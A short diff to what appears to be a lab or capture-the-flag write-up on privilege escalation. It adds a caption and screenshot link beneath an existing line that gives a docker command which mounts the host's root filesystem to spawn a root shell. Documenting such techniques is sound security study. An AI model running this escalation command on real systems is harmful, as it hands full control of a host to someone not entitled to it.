@@ -156,7 +156,12 @@
 - I used the payload to spawn a root shell with docker.
   Payload-:```docker run -v /:/mnt --rm -it alpine chroot /mnt bash```
 
--
+- Root as docker with host root directory mounted in it
+
+![image](https://github.com/user-attachments/assets/ba2d563b-5c52-41f7-aa34-38df0bb05937)
+
+
+
 
 
 
